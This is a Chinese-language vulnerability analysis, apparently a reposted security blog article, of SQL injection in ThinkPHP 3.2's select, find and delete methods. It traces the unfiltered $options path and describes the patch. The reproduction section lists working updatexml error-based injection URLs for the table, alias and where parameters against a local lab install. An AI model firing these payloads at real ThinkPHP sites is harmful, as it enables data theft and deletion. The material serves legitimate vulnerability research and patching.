> 原文链接: https://www.anquanke.com//post/id/157817 


# ThinkPHP3.2 框架sql注入漏洞分析（最新）


                                阅读量   
                                **339480**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                    



[![](https://p2.ssl.qhimg.com/t0180dbcf246fc2a443.png)](https://p2.ssl.qhimg.com/t0180dbcf246fc2a443.png)

作者：水泡泡（阿里云先知社区）



## 0x00 前言

北京时间 2018年8月23号11:25分 星期四，tp团队对于已经停止更新的thinkphp 3系列进行了一处安全更新，经过分析，此次更新修正了由于select(),find(),delete()方法可能会传入数组类型数据产生的多个sql注入隐患。



## 0x01 漏洞复现

下载源码：

```
git clone https://github.com/top-think/thinkphp.git
```

使用git checkout 命令将版本回退到上一次commit：

```
git checkout 109bf30254a38651c21837633d9293a4065c300b
```

使用phpstudy等集成工具搭建thinkphp，修改apache的配置文件httpd-conf

DocumentRoot “” 为thinkphp所在的目录。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180824173127-79bb91ea-a780-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180824173127-79bb91ea-a780-1.png)

重启phpstudy，访问127.0.0.1，输出thinkphp的欢迎信息，表示thinkphp已正常运行。[![](https://xzfile.aliyuncs.com/media/upload/picture/20180824173127-79c932be-a780-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180824173127-79c932be-a780-1.png)

搭建数据库，数据库为tptest,表为user，表里面有三个字段id,username,pass[![](https://xzfile.aliyuncs.com/media/upload/picture/20180824173127-79d25bfa-a780-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180824173127-79d25bfa-a780-1.png)

修改Application\Common\Conf\config.php配置文件，添加数据库配置信息。[![](https://xzfile.aliyuncs.com/media/upload/picture/20180824173127-79df83fc-a780-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180824173127-79df83fc-a780-1.png)

之后在Application\Home\Controller\IndexController.class.php 添加以下代码:

```
table：http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[table]=user where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--

alias：http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[alias]=where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--

where:http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--
```



[![](https://xzfile.aliyuncs.com/media/upload/picture/20180824173127-79eff908-a780-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180824173127-79eff908-a780-1.png)

而delete()方法的话同样，这里粗略举三个例子，table,alias,where，但使用table和alias的时候，同时还必须保证where不为空（详细原因后面会说）

```
where:http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--

alias:http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--

table:http://127.0.0.1/index.php?m=Home&amp;c=Index&amp;a=test&amp;id[table]=user%20where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--&amp;id[where]=1
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180824173127-7a0137e0-a780-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180824173127-7a0137e0-a780-1.png)



## 0x02 漏洞分析

通过github上的commit 对比其实可以粗略知道，此次更新主要是在ThinkPHP/Library/Think/Model.class.php文件中，其中对于delete，find，select三个函数进行了修改。

delete函数[![](https://xzfile.aliyuncs.com/media/upload/picture/20180824173128-7a13f5ce-a780-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180824173128-7a13f5ce-a780-1.png)

select函数[![](https://xzfile.aliyuncs.com/media/upload/picture/20180824173128-7a29932a-a780-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180824173128-7a29932a-a780-1.png)

find函数[![](https://xzfile.aliyuncs.com/media/upload/picture/20180824173128-7a3ba8c6-a780-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180824173128-7a3ba8c6-a780-1.png)

对比三个方法修改的地方都有一个共同点：

> 把外部传进来的$options，修改为$this-&gt;options，同时不再使用$this-&gt;_parseOptions对于$options进行表达式分析。

思考是因为$options可控，再经过_parseOptions函数之后产生了sql注入。

### 一 select 和 find 函数

以find函数为例进行分析（select代码类似），该函数可接受一个$options参数，作为查询数据的条件。

当$options为数字或者字符串类型的时候，直接指定当前查询表的主键作为查询字段：

```
if (is_numeric($options) || is_string($options)) `{`
            $where[$this-&gt;getPk()] = $options;
            $options               = array();
            $options['where']      = $where;
`}`
```

同时提供了对复合主键的查询，看到判断：

```
if (is_array($options) &amp;&amp; (count($options) &gt; 0) &amp;&amp; is_array($pk)) `{`
            // 根据复合主键查询
            ......
        `}`
```

要进入复合主键查询代码，需要满足$options为数组同时$pk主键也要为数组，但这个对于表只设置一个主键的时候不成立。

那么就可以使$options为数组，同时找到一个表只有一个主键，就可以绕过两次判断，直接进入_parseOptions进行解析。

```
if (is_numeric($options) || is_string($options)) `{`//$options为数组不进入
            $where[$this-&gt;getPk()] = $options;
            $options               = array();
            $options['where']      = $where;
        `}`
        // 根据复合主键查找记录
        $pk = $this-&gt;getPk();
        if (is_array($options) &amp;&amp; (count($options) &gt; 0) &amp;&amp; is_array($pk)) `{` //$pk不为数组不进入
            ......
        `}`
        // 总是查找一条记录
        $options['limit'] = 1;
        // 分析表达式
        $options = $this-&gt;_parseOptions($options); //解析表达式
        // 判断查询缓存
        .....
        $resultSet = $this-&gt;db-&gt;select($options); //底层执行
```

之后跟进_parseOptions方法，（分析见代码注释）

```
if (is_array($options)) `{` //当$options为数组的时候与$this-&gt;options数组进行整合
            $options = array_merge($this-&gt;options, $options);
        `}`

        if (!isset($options['table'])) `{`//判断是否设置了table 没设置进这里
            // 自动获取表名
            $options['table'] = $this-&gt;getTableName();
            $fields           = $this-&gt;fields;
        `}` else `{`
            // 指定数据表 则重新获取字段列表 但不支持类型检测
            $fields = $this-&gt;getDbFields(); //设置了进这里
        `}`

        // 数据表别名
        if (!empty($options['alias'])) `{`//判断是否设置了数据表别名
            $options['table'] .= ' ' . $options['alias']; //注意这里，直接拼接了
        `}`
        // 记录操作的模型名称
        $options['model'] = $this-&gt;name;

        // 字段类型验证
        if (isset($options['where']) &amp;&amp; is_array($options['where']) &amp;&amp; !empty($fields) &amp;&amp; !isset($options['join'])) `{` //让$optison['where']不为数组或没有设置不进这里
            // 对数组查询条件进行字段类型检查
           ......
        `}`
        // 查询过后清空sql表达式组装 避免影响下次查询
        $this-&gt;options = array();
        // 表达式过滤
        $this-&gt;_options_filter($options);
        return $options;
```

$options我们可控，那么就可以控制为数组类型，传入$options[‘table’]或$options[‘alias’]等等，只要提层不进行过滤都是可行的。

同时我们可以不设置$options[‘where’]或者设置$options[‘where’]的值为字符串，可绕过字段类型的验证。

可以看到在整个对$options的解析中没有过滤，直接返回，跟进到底层ThinkPHP\Libray\Think\Db\Diver.class.php，找到select方法，继续跟进最后来到parseSql方法，对$options的值进行替换，解析。

因为$options[‘table’]或$options[‘alias’]都是由parseTable函数进行解析，跟进：

```
if (is_array($tables)) `{`//为数组进
            // 支持别名定义
          ......
        `}` elseif (is_string($tables)) `{`//不为数组进
            $tables = array_map(array($this, 'parseKey'), explode(',', $tables));
        `}`
        return implode(',', $tables);
```

当我们传入的值不为数组，直接进行解析返回带进查询，没有任何过滤。

同时$options[‘where’]也一样，看到parseWhere函数

```
$whereStr = '';
        if (is_string($where)) `{`
            // 直接使用字符串条件
            $whereStr = $where; //直接返回了，没有任何过滤
        `}` else `{`
            // 使用数组表达式
           ......
        `}`
        return empty($whereStr) ? '' : ' WHERE ' . $whereStr;
```

二 delete函数

delete函数有些不同，主要是在解析完$options之后，还对$options[‘where’]判断了一下是否为空，需要我们传一下值，使之不为空,从而继续执行删除操作。

```
......
        // 分析表达式
        $options = $this-&gt;_parseOptions($options);
        if (empty($options['where'])) `{` //注意这里，还判断了一下$options['where']是否为空，为空直接返回，不再执行下面的代码。
            // 如果条件为空 不进行删除操作 除非设置 1=1
            return false;
        `}`
        if (is_array($options['where']) &amp;&amp; isset($options['where'][$pk])) `{`
            $pkValue = $options['where'][$pk];
        `}`

        if (false === $this-&gt;_before_delete($options)) `{`
            return false;
        `}`
        $result = $this-&gt;db-&gt;delete($options);
        if (false !== $result &amp;&amp; is_numeric($result)) `{`
            $data = array();
            if (isset($pkValue)) `{`
                $data[$pk] = $pkValue;
            `}`

            $this-&gt;_after_delete($data, $options);
        `}`
        // 返回删除记录个数
        return $result;
```



## 0x03 漏洞修复

不再分析由外部传进来的$options,使得不再可控$options[‘xxx’]。
